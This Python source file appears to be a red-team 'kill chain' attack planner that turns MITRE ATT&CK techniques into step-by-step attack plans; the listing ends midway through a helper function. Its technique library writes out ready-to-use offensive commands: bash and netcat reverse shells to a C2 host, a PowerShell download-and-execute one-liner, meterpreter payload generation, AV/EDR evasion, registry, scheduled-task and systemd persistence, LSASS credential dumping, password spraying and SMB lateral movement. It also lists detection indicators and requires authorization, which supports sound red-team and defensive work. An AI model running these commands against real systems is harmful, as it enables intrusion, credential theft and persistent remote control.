"""
Kill Chain Attack Planner - Red Team Planning Tool

This module generates attack PLANS following:
- Lockheed Martin Cyber Kill Chain
- MITRE ATT&CK Framework
- Unified Kill Chain

NOTE: This is a PLANNING TOOL, not an execution engine.
It generates actionable plans that human operators execute
using appropriate tools (Cobalt Strike, Sliver, manual testing).

Outputs:
- Step-by-step attack plans
- Tool commands for each phase
- MITRE ATT&CK technique mappings
- OPSEC considerations
- Detection indicators (for blue team awareness)

For actual execution, operators should:
1. Review generated plans
2. Obtain proper authorization
3. Execute using appropriate tools
4. Document findings
"""

import json
import time
import hashlib
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import List, Dict, Optional, Any, Tuple
import random


class KillChainPhase(Enum):
    """Kill chain phases based on Lockheed Martin model."""
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_CONTROL = "command_control"
    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"


class OPSECLevel(Enum):
    """Operational security levels affecting technique selection."""
    LOUD = "loud"           # No concern for detection (CTF, lab)
    NORMAL = "normal"       # Basic OPSEC
    CAREFUL = "careful"     # Avoid common detections
    STEALTHY = "stealthy"   # Maximum stealth
    APT = "apt"             # Nation-state level care


class TargetOS(Enum):
    """Target operating systems."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


@dataclass
class MITRETechnique:
    """MITRE ATT&CK technique representation."""
    id: str                  # e.g., T1566.001
    name: str
    tactic: str
    description: str
    phase: KillChainPhase

    # Execution details (for planning, not execution)
    tool_commands: Dict[str, str] = field(default_factory=dict)  # tool -> command
    manual_steps: List[str] = field(default_factory=list)
    detection_info: List[str] = field(default_factory=list)

    # Metadata
    requirements: List[str] = field(default_factory=list)
    opsec_impact: int = 3   # 1-5, higher = more detectable
    difficulty: int = 3     # 1-5, higher = more difficult

    # References
    mitre_url: str = ""
    references: List[str] = field(default_factory=list)


@dataclass
class Target:
    """Target for attack planning."""
    id: str
    hostname: str
    ip: str
    os: TargetOS = TargetOS.UNKNOWN
    domain: str = ""
    services: List[Dict] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    notes: str = ""


@dataclass
class AttackStep:
    """Individual step in an attack plan."""
    step_number: int
    phase: KillChainPhase
    technique: MITRETechnique
    target: str
    tool_commands: Dict[str, str]
    manual_steps: List[str]
    expected_outcome: str
    opsec_notes: List[str]
    detection_indicators: List[str]
    verification_steps: List[str]
    fallback_techniques: List[str]


@dataclass
class AttackPlan:
    """Complete attack plan for a campaign."""
    id: str
    name: str
    created_at: str
    targets: List[Target]
    objectives: List[str]
    opsec_level: OPSECLevel
    steps: List[AttackStep]
    total_phases: int
    estimated_detection_risk: str
    required_tools: List[str]
    prerequisites: List[str]
    notes: List[str]


class TechniqueLibrary:
    """
    Library of MITRE ATT&CK techniques with execution details.

    Each technique includes:
    - Tool commands for common red team tools
    - Manual execution steps
    - Detection indicators
    - OPSEC considerations
    """

    TECHNIQUES = {
        KillChainPhase.RECONNAISSANCE: [
            MITRETechnique(
                id="T1595.002",
                name="Active Scanning: Vulnerability Scanning",
                tactic="Reconnaissance",
                description="Scan target networks for vulnerabilities",
                phase=KillChainPhase.RECONNAISSANCE,
                tool_commands={
                    "nmap": "nmap -sV -sC --script vuln -oA scan_results {target}",
                    "nuclei": "nuclei -u {target} -t cves/ -o nuclei_results.txt",
                    "nikto": "nikto -h {target} -output nikto_results.txt",
                    "nessus": "# Use Nessus GUI: New Scan -> Web Application Tests",
                },
                manual_steps=[
                    "1. Define scope of targets to scan",
                    "2. Schedule scans during low-traffic periods if OPSEC required",
                    "3. Run vulnerability scanner against target",
                    "4. Parse and triage findings",
                    "5. Document exploitable vulnerabilities",
                ],
                detection_info=[
                    "IDS alerts for port scanning",
                    "Web server logs showing scanner UA strings",
                    "High volume of 404 errors from vulnerability checks",
                ],
                requirements=["Network access to target", "Scanning tools"],
                opsec_impact=4,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1595/002/",
            ),
            MITRETechnique(
                id="T1592",
                name="Gather Victim Host Information",
                tactic="Reconnaissance",
                description="Gather information about target hosts passively",
                phase=KillChainPhase.RECONNAISSANCE,
                tool_commands={
                    "shodan": "shodan search hostname:{domain}",
                    "censys": "censys search {domain}",
                    "whois": "whois {domain}",
                    "dig": "dig ANY {domain} +noall +answer",
                    "theHarvester": "theHarvester -d {domain} -b all",
                },
                manual_steps=[
                    "1. Query Shodan/Censys for exposed services",
                    "2. Perform DNS enumeration",
                    "3. Check SSL certificates for hostnames",
                    "4. Search GitHub for exposed code/configs",
                    "5. Document all discovered hosts and services",
                ],
                detection_info=[
                    "Difficult to detect - uses public sources",
                    "May appear in third-party API logs",
                ],
                requirements=["Domain name or IP range"],
                opsec_impact=1,
                difficulty=1,
                mitre_url="https://attack.mitre.org/techniques/T1592/",
            ),
            MITRETechnique(
                id="T1589.002",
                name="Gather Victim Identity Information: Email Addresses",
                tactic="Reconnaissance",
                description="Gather email addresses for phishing",
                phase=KillChainPhase.RECONNAISSANCE,
                tool_commands={
                    "hunter.io": "# Use hunter.io API or web interface",
                    "theHarvester": "theHarvester -d {domain} -b google,linkedin -l 500",
                    "linkedin2username": "linkedin2username.py -c 'Company Name'",
                    "crosslinked": "crosslinked -f '{first}.{last}@{domain}' 'Company Name'",
                },
                manual_steps=[
                    "1. Use Hunter.io to find email format",
                    "2. Scrape LinkedIn for employee names",
                    "3. Generate email list using discovered format",
                    "4. Verify emails using SMTP RCPT TO",
                    "5. Prioritize high-value targets (IT, finance)",
                ],
                detection_info=[
                    "LinkedIn access logs",
                    "SMTP verification attempts in mail logs",
                ],
                requirements=["Target domain", "OSINT tools"],
                opsec_impact=1,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1589/002/",
            ),
        ],
        KillChainPhase.WEAPONIZATION: [
            MITRETechnique(
                id="T1587.001",
                name="Develop Capabilities: Malware",
                tactic="Resource Development",
                description="Create custom malware/implants",
                phase=KillChainPhase.WEAPONIZATION,
                tool_commands={
                    "sliver": "sliver> generate --mtls {c2_server}:8888 --os windows --arch amd64",
                    "cobalt_strike": "Attacks -> Packages -> Windows Executable (S)",
                    "msfvenom": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={c2} LPORT=443 -f exe -o payload.exe",
                    "havoc": "# Use Havoc client: Payloads -> Generate",
                },
                manual_steps=[
                    "1. Select appropriate payload for target OS",
                    "2. Configure C2 callback address",
                    "3. Apply evasion techniques (obfuscation, encoding)",
                    "4. Test payload against local AV",
                    "5. Stage payload on delivery infrastructure",
                ],
                detection_info=[
                    "Sandbox analysis may detonate payload",
                    "VirusTotal upload would expose IOCs",
                ],
                requirements=["C2 infrastructure", "Payload generation tools"],
                opsec_impact=1,
                difficulty=3,
                mitre_url="https://attack.mitre.org/techniques/T1587/001/",
            ),
            MITRETechnique(
                id="T1027",
                name="Obfuscated Files or Information",
                tactic="Defense Evasion",
                description="Obfuscate payloads to evade detection",
                phase=KillChainPhase.WEAPONIZATION,
                tool_commands={
                    "donut": "donut -i beacon.exe -o loader.bin",
                    "scarecrow": "ScareCrow -I beacon.bin -domain microsoft.com",
                    "invoke_obfuscation": "Invoke-Obfuscation -ScriptPath payload.ps1",
                    "confuserex": "# Use ConfuserEx GUI for .NET obfuscation",
                },
                manual_steps=[
                    "1. Select obfuscation technique appropriate for payload type",
                    "2. Apply shellcode loaders if needed",
                    "3. Test against target's known AV/EDR",
                    "4. Iterate until bypassing detections",
                    "5. Document successful evasion technique",
                ],
                detection_info=[
                    "Behavioral analysis may still detect",
                    "Memory scanning can find deobfuscated code",
                ],
                requirements=["Payload", "Obfuscation tools"],
                opsec_impact=1,
                difficulty=4,
                mitre_url="https://attack.mitre.org/techniques/T1027/",
            ),
        ],
        KillChainPhase.DELIVERY: [
            MITRETechnique(
                id="T1566.001",
                name="Phishing: Spearphishing Attachment",
                tactic="Initial Access",
                description="Send malicious attachment via email",
                phase=KillChainPhase.DELIVERY,
                tool_commands={
                    "gophish": "# Configure campaign in GoPhish web UI",
                    "king_phisher": "# Use King Phisher GUI",
                    "manual": "# Use legitimate email client with spoofed sender",
                },
                manual_steps=[
                    "1. Craft convincing phishing email",
                    "2. Attach weaponized document",
                    "3. Configure tracking (pixel, link)",
                    "4. Send to target email addresses",
                    "5. Monitor for callbacks/opens",
                ],
                detection_info=[
                    "Email gateway analysis",
                    "Sandbox detonation of attachment",
                    "User reports to security team",
                ],
                requirements=["Target email addresses", "Phishing infrastructure", "Weaponized payload"],
                opsec_impact=3,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1566/001/",
            ),
            MITRETechnique(
                id="T1190",
                name="Exploit Public-Facing Application",
                tactic="Initial Access",
                description="Exploit vulnerability in external application",
                phase=KillChainPhase.DELIVERY,
                tool_commands={
                    "metasploit": "use exploit/{exploit_module}; set RHOSTS {target}; exploit",
                    "sqlmap": "sqlmap -u '{url}' --os-shell",
                    "nuclei": "nuclei -u {target} -t cves/{cve}.yaml",
                    "manual": "# Execute manual exploit code",
                },
                manual_steps=[
                    "1. Identify vulnerable service/application",
                    "2. Obtain or develop working exploit",
                    "3. Test exploit in lab environment",
                    "4. Execute against target",
                    "5. Establish persistence if successful",
                ],
                detection_info=[
                    "WAF/IDS signatures for exploit patterns",
                    "Application error logs",
                    "Anomalous process execution on server",
                ],
                requirements=["Identified vulnerability", "Working exploit"],
                opsec_impact=4,
                difficulty=3,
                mitre_url="https://attack.mitre.org/techniques/T1190/",
            ),
            MITRETechnique(
                id="T1133",
                name="External Remote Services",
                tactic="Initial Access",
                description="Use valid credentials for external services",
                phase=KillChainPhase.DELIVERY,
                tool_commands={
                    "hydra": "hydra -L users.txt -P passwords.txt {target} ssh",
                    "crackmapexec": "crackmapexec smb {target} -u users.txt -p passwords.txt",
                    "spray": "spray.py -smb {target} -u users.txt -p 'Password1!'",
                    "manual": "# Use RDP/SSH client with valid creds",
                },
                manual_steps=[
                    "1. Identify accessible remote services (RDP, SSH, VPN)",
                    "2. Obtain credential list (reuse, spray, purchased)",
                    "3. Carefully spray to avoid lockouts",
                    "4. Log in with valid credentials",
                    "5. Establish foothold",
                ],
                detection_info=[
                    "Failed login attempts in security logs",
                    "Account lockouts",
                    "Anomalous login locations/times",
                ],
                requirements=["Remote service access", "Credential list"],
                opsec_impact=5,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1133/",
            ),
        ],
        KillChainPhase.EXPLOITATION: [
            MITRETechnique(
                id="T1059.001",
                name="PowerShell Execution",
                tactic="Execution",
                description="Execute malicious PowerShell commands",
                phase=KillChainPhase.EXPLOITATION,
                tool_commands={
                    "empire": "usemodule powershell/code_execution/invoke_shellcode",
                    "cobalt_strike": "powershell-import script.ps1; powershell {command}",
                    "manual": 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"',
                },
                manual_steps=[
                    "1. Prepare PowerShell payload/script",
                    "2. Deliver to target via initial access",
                    "3. Execute with appropriate bypass (-ep bypass)",
                    "4. Establish connection back to C2",
                    "5. Verify successful execution",
                ],
                detection_info=[
                    "PowerShell script block logging (4104)",
                    "AMSI detections",
                    "Suspicious PowerShell command lines",
                    "Network connections from PowerShell",
                ],
                requirements=["Initial access", "PowerShell not blocked"],
                opsec_impact=3,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1059/001/",
            ),
            MITRETechnique(
                id="T1059.004",
                name="Unix Shell Execution",
                tactic="Execution",
                description="Execute commands via Unix shell",
                phase=KillChainPhase.EXPLOITATION,
                tool_commands={
                    "bash": "bash -c 'bash -i >& /dev/tcp/{c2}/{port} 0>&1'",
                    "python": "python3 -c 'import socket,subprocess,os;...'",
                    "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2} {port} >/tmp/f",
                },
                manual_steps=[
                    "1. Gain initial shell access",
                    "2. Execute reverse shell one-liner",
                    "3. Upgrade to interactive shell if needed",
                    "4. Enumerate system for escalation",
                    "5. Establish persistence",
                ],
                detection_info=[
                    "Shell history logging",
                    "auditd process execution logs",
                    "Outbound connections from shell processes",
                ],
                requirements=["Shell access", "Network connectivity to C2"],
                opsec_impact=2,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1059/004/",
            ),
        ],
        KillChainPhase.INSTALLATION: [
            MITRETechnique(
                id="T1547.001",
                name="Registry Run Keys Persistence",
                tactic="Persistence",
                description="Add malware to Windows registry run keys",
                phase=KillChainPhase.INSTALLATION,
                tool_commands={
                    "reg": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\path\\to\\payload.exe"',
                    "powershell": 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
                    "cobalt_strike": "persist (select registry method)",
                },
                manual_steps=[
                    "1. Upload payload to target",
                    "2. Add registry key for persistence",
                    "3. Verify key was created",
                    "4. Test persistence by logging out/in",
                    "5. Document for cleanup",
                ],
                detection_info=[
                    "Registry modification events (4657)",
                    "Sysmon registry events (12, 13, 14)",
                    "Autoruns detection",
                ],
                requirements=["User or admin access", "Payload on disk"],
                opsec_impact=3,
                difficulty=1,
                mitre_url="https://attack.mitre.org/techniques/T1547/001/",
            ),
            MITRETechnique(
                id="T1053.005",
                name="Scheduled Task Persistence",
                tactic="Persistence",
                description="Create scheduled task for persistence",
                phase=KillChainPhase.INSTALLATION,
                tool_commands={
                    "schtasks": 'schtasks /create /tn "UpdateCheck" /tr "C:\\payload.exe" /sc onlogon /ru System',
                    "powershell": '$action = New-ScheduledTaskAction -Execute "payload.exe"; Register-ScheduledTask -TaskName "Update" -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogon)',
                    "cobalt_strike": "persist (select scheduled task)",
                },
                manual_steps=[
                    "1. Upload payload to accessible location",
                    "2. Create scheduled task with appropriate trigger",
                    "3. Verify task was created",
                    "4. Test execution manually",
                    "5. Document for cleanup",
                ],
                detection_info=[
                    "Task creation events (4698)",
                    "Sysmon process creation from taskeng/svchost",
                    "Task Scheduler log entries",
                ],
                requirements=["Admin access for SYSTEM tasks", "Payload on disk"],
                opsec_impact=3,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1053/005/",
            ),
            MITRETechnique(
                id="T1543.002",
                name="Systemd Service Persistence",
                tactic="Persistence",
                description="Create systemd service for Linux persistence",
                phase=KillChainPhase.INSTALLATION,
                tool_commands={
                    "manual": """cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=Update Service
[Service]
ExecStart=/path/to/payload
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service""",
                },
                manual_steps=[
                    "1. Create systemd service file",
                    "2. Copy to /etc/systemd/system/",
                    "3. Reload systemd daemon",
                    "4. Enable and start service",
                    "5. Verify persistence",
                ],
                detection_info=[
                    "New files in systemd directories",
                    "systemctl commands in audit logs",
                    "Unknown services running",
                ],
                requirements=["Root access", "Payload on disk"],
                opsec_impact=3,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1543/002/",
            ),
        ],
        KillChainPhase.COMMAND_CONTROL: [
            MITRETechnique(
                id="T1071.001",
                name="Web Protocols C2",
                tactic="Command and Control",
                description="Use HTTP/HTTPS for C2 communication",
                phase=KillChainPhase.COMMAND_CONTROL,
                tool_commands={
                    "sliver": "sliver> https --lhost 0.0.0.0 --lport 443",
                    "cobalt_strike": "Cobalt Strike > Listeners > Add > HTTPS",
                    "havoc": "# Configure HTTPS listener in teamserver profile",
                },
                manual_steps=[
                    "1. Configure HTTPS listener on C2 server",
                    "2. Set up valid SSL certificate",
                    "3. Configure malleable C2 profile if applicable",
                    "4. Test connectivity from target network",
                    "5. Monitor for callbacks",
                ],
                detection_info=[
                    "Beaconing patterns in network traffic",
                    "JA3/JA3S fingerprints",
                    "Unusual HTTPS destinations",
                ],
                requirements=["C2 server", "SSL certificate", "Domain"],
                opsec_impact=2,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1071/001/",
            ),
            MITRETechnique(
                id="T1071.004",
                name="DNS C2",
                tactic="Command and Control",
                description="Use DNS for covert C2 communication",
                phase=KillChainPhase.COMMAND_CONTROL,
                tool_commands={
                    "sliver": "sliver> dns --lhost 0.0.0.0 --domain c2.example.com",
                    "cobalt_strike": "Cobalt Strike > Listeners > Add > Beacon DNS",
                    "iodine": "iodined -f 10.0.0.1 c2.example.com",
                    "dnscat2": "ruby dnscat2.rb c2.example.com",
                },
                manual_steps=[
                    "1. Register domain for C2",
                    "2. Configure NS records to point to C2 server",
                    "3. Start DNS C2 server",
                    "4. Deploy DNS-capable implant",
                    "5. Monitor DNS queries for callbacks",
                ],
                detection_info=[
                    "High volume DNS queries to single domain",
                    "Long DNS query names (encoded data)",
                    "TXT record queries",
                ],
                requirements=["Domain with NS control", "DNS C2 server"],
                opsec_impact=2,
                difficulty=3,
                mitre_url="https://attack.mitre.org/techniques/T1071/004/",
            ),
        ],
        KillChainPhase.ACTIONS_ON_OBJECTIVES: [
            MITRETechnique(
                id="T1003.001",
                name="LSASS Memory Credential Dumping",
                tactic="Credential Access",
                description="Dump credentials from LSASS memory",
                phase=KillChainPhase.ACTIONS_ON_OBJECTIVES,
                tool_commands={
                    "mimikatz": "mimikatz # sekurlsa::logonpasswords",
                    "pypykatz": "pypykatz lsa minidump lsass.dmp",
                    "procdump": "procdump -ma lsass.exe lsass.dmp",
                    "cobalt_strike": "logonpasswords",
                },
                manual_steps=[
                    "1. Obtain SYSTEM or admin privileges",
                    "2. Dump LSASS memory (live or minidump)",
                    "3. Parse dump for credentials",
                    "4. Document captured credentials",
                    "5. Use for lateral movement",
                ],
                detection_info=[
                    "LSASS access events",
                    "Procdump execution",
                    "Mimikatz signatures",
                    "Credential Guard blocks this",
                ],
                requirements=["SYSTEM privileges", "No Credential Guard"],
                opsec_impact=4,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1003/001/",
            ),
            MITRETechnique(
                id="T1041",
                name="Exfiltration Over C2 Channel",
                tactic="Exfiltration",
                description="Exfiltrate data through existing C2",
                phase=KillChainPhase.ACTIONS_ON_OBJECTIVES,
                tool_commands={
                    "cobalt_strike": "download C:\\sensitive\\data.xlsx",
                    "sliver": "sliver> download /path/to/sensitive/data",
                    "manual": "# Use established C2 file transfer capability",
                },
                manual_steps=[
                    "1. Identify target data for exfiltration",
                    "2. Stage data in temporary location if large",
                    "3. Compress/encrypt if needed",
                    "4. Transfer via C2 channel",
                    "5. Verify receipt and cleanup staging",
                ],
                detection_info=[
                    "Large outbound transfers over C2",
                    "File access to sensitive locations",
                    "Compression utility execution",
                ],
                requirements=["C2 established", "Access to target data"],
                opsec_impact=3,
                difficulty=1,
                mitre_url="https://attack.mitre.org/techniques/T1041/",
            ),
            MITRETechnique(
                id="T1021.002",
                name="SMB/Windows Admin Shares Lateral Movement",
                tactic="Lateral Movement",
                description="Move laterally using SMB and admin shares",
                phase=KillChainPhase.ACTIONS_ON_OBJECTIVES,
                tool_commands={
                    "psexec": "psexec.exe \\\\{target} -u {user} -p {pass} cmd.exe",
                    "crackmapexec": "crackmapexec smb {target} -u {user} -p {pass} -x 'whoami'",
                    "wmiexec": "wmiexec.py {domain}/{user}:{pass}@{target}",
                    "smbexec": "smbexec.py {domain}/{user}:{pass}@{target}",
                },
                manual_steps=[
                    "1. Obtain valid credentials (local admin or domain)",
                    "2. Identify target hosts for lateral movement",
                    "3. Test access using SMB",
                    "4. Execute commands or deploy implant",
                    "5. Establish persistence on new host",
                ],
                detection_info=[
                    "Windows Event 4624 type 3 logins",
                    "Service creation events",
                    "SMB traffic to admin shares",
                ],
                requirements=["Valid credentials", "SMB access to target"],
                opsec_impact=4,
                difficulty=2,
                mitre_url="https://attack.mitre.org/techniques/T1021/002/",
            ),
        ],
    }

    @classmethod
    def get_techniques(cls, phase: KillChainPhase,
                      max_opsec: int = 5,
                      target_os: TargetOS = None) -> List[MITRETechnique]:
        """Get techniques for a phase, filtered by OPSEC and OS."""
        techniques = cls.TECHNIQUES.get(phase, [])
        filtered = [t for t in techniques if t.opsec_impact <= max_opsec]

        # Filter by OS if specified
        if target_os:
            os_techniques = []
            for t in filtered:
                # Check if technique is OS-specific
                name_lower = t.name.lower()
                if target_os == TargetOS.WINDOWS:
                    if "unix" not in name_lower and "linux" not in name_lower and "systemd" not in name_lower:
                        os_techniques.append(t)
                elif target_os == TargetOS.LINUX:
                    if "windows" not in name_lower and "registry" not in name_lower and "powershell" not in name_lower:
                        os_techniques.append(t)
                else:
                    os_techniques.append(t)
            filtered = os_techniques

        return filtered

    @classmethod
    def get_by_id(cls, technique_id: str) -> Optional[MITRETechnique]:
        """Get technique by ATT&CK ID."""
        for techniques in cls.TECHNIQUES.values():
            for t in techniques:
                if t.id == technique_id:
                    return t
        return None


class AttackPlanner:
    """
    Generate attack plans for human operators.

    This class creates detailed, step-by-step attack plans
    that operators can follow using their tools of choice.
    It does NOT execute any attacks.
    """

    def __init__(self, opsec_level: OPSECLevel = OPSECLevel.NORMAL):
        self.opsec_level = opsec_level
        self.max_opsec = {
            OPSECLevel.LOUD: 5,
            OPSECLevel.NORMAL: 4,
            OPSECLevel.CAREFUL: 3,
            OPSECLevel.STEALTHY: 2,
            OPSECLevel.APT: 1,
        }[opsec_level]

    def create_plan(
        self,
        name: str,
        targets: List[Dict],
        objectives: List[str],
        phases: List[KillChainPhase] = None,
    ) -> AttackPlan:
        """
        Create a comprehensive attack plan.

        Args:
            name: Campaign name
            targets: List of target definitions
            objectives: Campaign objectives
            phases: Phases to include (default: all)

        Returns:
            Complete AttackPlan with step-by-step instructions
        """
        if phases is None:
            phases = list(KillChainPhase)

        # Convert target dicts to Target objects
        target_objs = []
        for t in targets:
            os_type = TargetOS.UNKNOWN
            if "os" in t:
                os_str = t["os"].lower()
                if "windows" in os_str:
                    os_type = TargetOS.WINDOWS
                elif "linux" in os_str:
                    os_type = TargetOS.LINUX
                elif "mac" in os_str or "darwin" in os_str:
                    os_type = TargetOS.MACOS

            target_objs.append(Target(
                id=str(uuid.uuid4())[:8],
                hostname=t.get("hostname", ""),
                ip=t.get("ip", ""),
                os=os_type,
                domain=t.get("domain", ""),
            ))

        # Generate steps for each phase
        steps = []
        step_num = 0
        required_tools = set()

        for phase in phases:
            techniques = TechniqueLibrary.get_techniques(
                phase, self.max_opsec
            )

            for target in target_objs:
                # Filter techniques by target OS
                os_techniques = TechniqueLibrary.get_techniques(
                    phase, self.max_opsec, target.os
                )

                if not os_techniques:
                    continue

                # Select best technique for this target
                technique = os_techniques[0]  # Highest success rate
                step_num += 1

                # Collect required tools
                required_tools.update(technique.tool_commands.keys())

                # Build OPSEC notes based on level
                opsec_notes = []
                if self.opsec_level in [OPSECLevel.CAREFUL, OPSECLevel.STEALTHY, OPSECLevel.APT]:
                    opsec_notes = [
                        f"Technique OPSEC impact: {technique.opsec_impact}/5",
                        "Consider timing operations during business hours",
                        "Monitor for defensive responses before proceeding",
                    ]

                # Build verification steps
                verification = [
                    "Verify command executed successfully",
                    "Check for expected artifacts/output",
                    "Monitor for detection indicators",
                ]

                # Get alternative techniques as fallbacks
                fallbacks = [t.id for t in os_techniques[1:3]] if len(os_techniques) > 1 else []

                step = AttackStep(
                    step_number=step_num,
                    phase=phase,
                    technique=technique,
                    target=target.hostname or target.ip,
                    tool_commands=technique.tool_commands.copy(),
                    manual_steps=technique.manual_steps.copy(),
                    expected_outcome=f"Successful {technique.name}",
                    opsec_notes=opsec_notes,
                    detection_indicators=technique.detection_info.copy(),
                    verification_steps=verification,
                    fallback_techniques=fallbacks,
                )
                steps.append(step)

        # Calculate overall detection risk
        if steps:
            avg_opsec = sum(s.technique.opsec_impact for s in steps) / len(steps)
            if avg_opsec >= 4:
                risk = "HIGH"
            elif avg_opsec >= 3:
                risk = "MEDIUM"
            else:
                risk = "LOW"
        else:
            risk = "UNKNOWN"

        # Prerequisites
        prerequisites = [
            "Written authorization for all targets",
            "Defined rules of engagement",
            "Emergency contact information",
            "Backup access method if C2 fails",
        ]

        # Notes
        notes = [
            "This is a PLAN - review thoroughly before execution",
            "Adapt techniques based on real-time findings",
            "Document all actions for reporting",
            f"OPSEC Level: {self.opsec_level.value}",
        ]

        return AttackPlan(
            id=str(uuid.uuid4())[:8],
            name=name,
            created_at=datetime.utcnow().isoformat(),
            targets=target_objs,
            objectives=objectives,
            opsec_level=self.opsec_level,
            steps=steps,
            total_phases=len(phases),
            estimated_detection_risk=risk,
            required_tools=list(required_tools),
            prerequisites=prerequisites,
            notes=notes,
        )

    def export_plan(self, plan: AttackPlan, format: str = "json") -> str:
        """
        Export attack plan to various formats.

        Args:
            plan: AttackPlan to export
            format: Output format (json, markdown)

        Returns:
            Formatted plan string
        """
        if format == "json":
            return self._export_json(plan)
        elif format == "markdown":
            return self._export_markdown(plan)
        else:
            return self._export_json(plan)

    def _export_json(self, plan: AttackPlan) -> str:
        """Export plan as JSON."""
        data = {
            "id": plan.id,
            "name": plan.name,
            "created_at": plan.created_at,
            "opsec_level": plan.opsec_level.value,
            "detection_risk": plan.estimated_detection_risk,
            "targets": [
                {
                    "hostname": t.hostname,
                    "ip": t.ip,
                    "os": t.os.value,
                    "domain": t.domain,
                }
                for t in plan.targets
            ],
            "objectives": plan.objectives,
            "prerequisites": plan.prerequisites,
            "required_tools": plan.required_tools,
            "steps": [
                {
                    "step": s.step_number,
                    "phase": s.phase.value,
                    "technique_id": s.technique.id,
                    "technique_name": s.technique.name,
                    "target": s.target,
                    "tool_commands": s.tool_commands,
                    "manual_steps": s.manual_steps,
                    "expected_outcome": s.expected_outcome,
                    "opsec_notes": s.opsec_notes,
                    "detection_indicators": s.detection_indicators,
                    "verification_steps": s.verification_steps,
                    "fallbacks": s.fallback_techniques,
                }
                for s in plan.steps
            ],
            "notes": plan.notes,
        }
        return json.dumps(data, indent=2)

    def _export_markdown(self, plan: AttackPlan) -> str:
        """Export plan as Markdown."""
        md = f"""# Attack Plan: {plan.name}

**ID:** {plan.id}
**Created:** {plan.created_at}
**OPSEC Level:** {plan.opsec_level.value}
**Detection Risk:** {plan.estimated_detection_risk}

## Targets

| Hostname | IP | OS | Domain |
|----------|----|----|--------|
"""
        for t in plan.targets:
            md += f"| {t.hostname} | {t.ip} | {t.os.value} | {t.domain} |\n"

        md += f"""
## Objectives

"""
        for obj in plan.objectives:
            md += f"- {obj}\n"

        md += f"""
## Prerequisites

"""
        for prereq in plan.prerequisites:
            md += f"- {prereq}\n"

        md += f"""
## Required Tools

"""
        for tool in plan.required_tools:
            md += f"- {tool}\n"

        md += """
## Attack Steps

"""
        current_phase = None
        for step in plan.steps:
            if step.phase != current_phase:
                current_phase = step.phase
                md += f"\n### Phase: {current_phase.value.upper()}\n\n"

            md += f"""#### Step {step.step_number}: {step.technique.name}

**Technique:** {step.technique.id}
**Target:** {step.target}
**MITRE URL:** {step.technique.mitre_url}

**Tool Commands:**
```
"""
            for tool, cmd in step.tool_commands.items():
                md += f"# {tool}\n{cmd}\n\n"
            md += "```\n\n"

            md += "**Manual Steps:**\n"
            for s in step.manual_steps:
                md += f"{s}\n"

            md += "\n**Expected Outcome:** " + step.expected_outcome + "\n"

            if step.opsec_notes:
                md += "\n**OPSEC Notes:**\n"
                for note in step.opsec_notes:
                    md += f"- {note}\n"

            md += "\n**Detection Indicators:**\n"
            for ind in step.detection_indicators:
                md += f"- {ind}\n"

            if step.fallback_techniques:
                md += "\n**Fallback Techniques:** " + ", ".join(step.fallback_techniques) + "\n"

            md += "\n---\n"

        md += """
## Notes

"""
        for note in plan.notes:
            md += f"- {note}\n"

        return md


class CampaignTemplates:
    """
    Pre-built campaign templates for common scenarios.
    These generate PLANS, not execute attacks.
    """

    @staticmethod
    def phishing_campaign(
        targets: List[Dict],
        objective: str = "Gain initial access via phishing"
    ) -> AttackPlan:
        """Generate phishing campaign plan."""
        planner = AttackPlanner(OPSECLevel.NORMAL)

        return planner.create_plan(
            name="Phishing Campaign",
            targets=targets,
            objectives=[objective, "Establish C2 communication"],
            phases=[
                KillChainPhase.RECONNAISSANCE,
                KillChainPhase.WEAPONIZATION,
                KillChainPhase.DELIVERY,
                KillChainPhase.EXPLOITATION,
                KillChainPhase.COMMAND_CONTROL,
            ],
        )

    @staticmethod
    def network_pentest(
        targets: List[Dict],
        objective: str = "Identify and exploit network vulnerabilities"
    ) -> AttackPlan:
        """Generate network pentest plan."""
        planner = AttackPlanner(OPSECLevel.CAREFUL)

        return planner.create_plan(
            name="Network Penetration Test",
            targets=targets,
            objectives=[
                objective,
                "Gain privileged access",
                "Move laterally",
                "Access sensitive data",
            ],
            phases=list(KillChainPhase),  # All phases
        )

    @staticmethod
    def red_team_engagement(
        domain: str,
        targets: List[Dict],
        objectives: List[str]
    ) -> AttackPlan:
        """Generate red team engagement plan."""
        planner = AttackPlanner(OPSECLevel.STEALTHY)

        # Add domain to targets
        for t in targets:
            t["domain"] = domain

        return planner.create_plan(
            name=f"Red Team - {domain}",
            targets=targets,
            objectives=objectives or [
                "Simulate advanced threat actor",
                "Test detection capabilities",
                "Access crown jewels",
            ],
            phases=list(KillChainPhase),
        )


# Convenience functions

def create_attack_plan(
    name: str,
    targets: List[Dict],
    objectives: List[str],
    opsec: str = "normal"
) -> Dict:
    """
    Quick function to create an attack plan.

    Args:
        name: Campaign name
        targets: List of {"hostname": "", "ip": "", "os": ""}
        objectives: List of objectives
        opsec: OPSEC level (loud, normal, careful, stealthy, apt)

    Returns:
